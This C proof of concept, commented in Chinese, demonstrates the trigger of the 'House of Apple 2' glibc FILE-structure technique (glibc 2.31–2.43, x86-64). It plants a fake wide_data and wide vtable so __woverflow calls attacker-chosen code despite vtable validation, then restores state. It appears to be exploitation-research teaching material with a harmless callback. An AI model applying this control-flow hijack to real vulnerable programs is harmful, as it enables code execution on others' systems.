#define _GNU_SOURCE
/*
 * 手法：House of Apple 2 最终触发点；适用 glibc 2.31～2.43，x86-64。
 *
 * 模拟漏洞：攻击者已经能覆盖一个 FILE 的 `_wide_data` 指针。
 * 本 PoC 不假设 largebin、stderr 覆盖或 hook；它只隔离验证 Apple2 最关键的
 * 消费链：
 *
 *   调用入口：__woverflow(fp, L'A')
 *     -> primary vtable 中合法的 _IO_wfile_overflow
 *     -> 分配入口：_IO_wdoallocbuf(fp)
 *     -> 伪宽表调用：fake wide_data->_wide_vtable->__doallocate(fp)
 *     -> 成功回调：apple2_callback(fp)
 *
 * primary vtable 仍指向 `__libc_IO_vtables` 内的 `_IO_wfile_jumps`，所以能
 * 通过 2.24 起的 vtable validation；wide vtable 在本范围内没有同等校验。
 *
 * 2.31 起 x86-64 `_IO_wide_data._wide_vtable` 位于 +0xe0。2.30 和更旧版本
 * 的结构偏移不同，请使用本目录另外两份 C PoC。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

typedef wint_t (*woverflow_fn)(FILE *, wint_t);

static int callback_count;
static FILE *callback_file;

static int apple2_callback(FILE *fp)
{
    callback_count++;
    callback_file = fp;

    /* 返回 WEOF，使 `_IO_wdoallocbuf` 使用 fake wide_data 内的 `_shortbuf`
       作为一字符后备缓冲；这样调用链能安全返回，不依赖真实 malloc。 */
    return WEOF;
}

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == 0xd8);

    FILE *fp = tmpfile();
    assert(fp != NULL);

    void *wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    woverflow_fn call_woverflow =
        (woverflow_fn)dlsym(RTLD_DEFAULT, "__woverflow");
    assert(wfile_jumps != NULL && call_woverflow != NULL);

    /* 保存所有将被 _IO_wfile_overflow 修改的真实 FILE 字段。触发结束后恢复，
       避免 fclose 或进程退出再次消费栈上的 fake wide_data。 */
    void **wide_data_slot = (void **)((char *)fp + 0xa0);
    void **primary_vtable_slot = (void **)((char *)fp + sizeof(FILE));
    void *saved_wide_data = *wide_data_slot;
    void *saved_primary_vtable = *primary_vtable_slot;
    int saved_flags = fp->_flags;
    int saved_flags2 = fp->_flags2;
    int saved_mode = fp->_mode;
    char *saved_read_ptr = fp->_IO_read_ptr;
    char *saved_read_end = fp->_IO_read_end;
    char *saved_read_base = fp->_IO_read_base;
    char *saved_write_base = fp->_IO_write_base;
    char *saved_write_ptr = fp->_IO_write_ptr;
    char *saved_write_end = fp->_IO_write_end;
    char *saved_buf_base = fp->_IO_buf_base;
    char *saved_buf_end = fp->_IO_buf_end;

    /* fake wide data 要容纳到 +0xe0 的 vtable 指针和其后的读写空间。 */
    uint64_t fake_wide_data[0x100 / 8] __attribute__((aligned(0x10)));
    uint64_t fake_wide_vtable[0x80 / 8] __attribute__((aligned(0x10)));
    char narrow_buffer[0x20];
    memset(fake_wide_data, 0, sizeof(fake_wide_data));
    memset(fake_wide_vtable, 0, sizeof(fake_wide_vtable));
    memset(narrow_buffer, 0, sizeof(narrow_buffer));

    /* `_IO_jump_t.__doallocate` 的槽偏移恒为 +0x68。fake wide_data 的
       `_IO_write_base==NULL` 与 `_IO_buf_base==NULL` 会进入 WDOALLOCATE。 */
    fake_wide_data[0xe0 / 8] = (uintptr_t)fake_wide_vtable;
    fake_wide_vtable[0x68 / 8] = (uintptr_t)apple2_callback;

    *wide_data_slot = fake_wide_data;
    *primary_vtable_slot = wfile_jumps;
    fp->_mode = 1;                    /* 把 FILE 标成宽字符流。 */

    /* 清除 NO_WRITES、UNBUFFERED、CURRENTLY_PUTTING。UNBUFFERED 若保留，
       `_IO_wdoallocbuf` 会直接跳过 WDOALLOCATE，callback 就不会触发。 */
    fp->_flags &= ~(0x8 | 0x2 | 0x800);

    /* primary 窄缓冲设为有效栈区，防止 wide overflow 在 callback 返回后
       额外调用 `_IO_doallocbuf`；这与 Apple2 控制 wide vtable 无关。 */
    fp->_IO_read_base = narrow_buffer;
    fp->_IO_read_ptr = narrow_buffer;
    fp->_IO_read_end = narrow_buffer;
    fp->_IO_write_base = narrow_buffer;
    fp->_IO_write_ptr = narrow_buffer;
    fp->_IO_write_end = narrow_buffer + sizeof(narrow_buffer);
    fp->_IO_buf_base = narrow_buffer;
    fp->_IO_buf_end = narrow_buffer + sizeof(narrow_buffer);

    wint_t result = call_woverflow(fp, L'A');

    assert(callback_count == 1);
    assert(callback_file == fp);
    assert(result == L'A');

    *wide_data_slot = saved_wide_data;
    *primary_vtable_slot = saved_primary_vtable;
    fp->_flags = saved_flags;
    fp->_flags2 = saved_flags2;
    fp->_mode = saved_mode;
    fp->_IO_read_ptr = saved_read_ptr;
    fp->_IO_read_end = saved_read_end;
    fp->_IO_read_base = saved_read_base;
    fp->_IO_write_base = saved_write_base;
    fp->_IO_write_ptr = saved_write_ptr;
    fp->_IO_write_end = saved_write_end;
    fp->_IO_buf_base = saved_buf_base;
    fp->_IO_buf_end = saved_buf_end;
    fclose(fp);

    puts("[+] Apple2：宽表 +0xe0 命中");
    return 0;
}
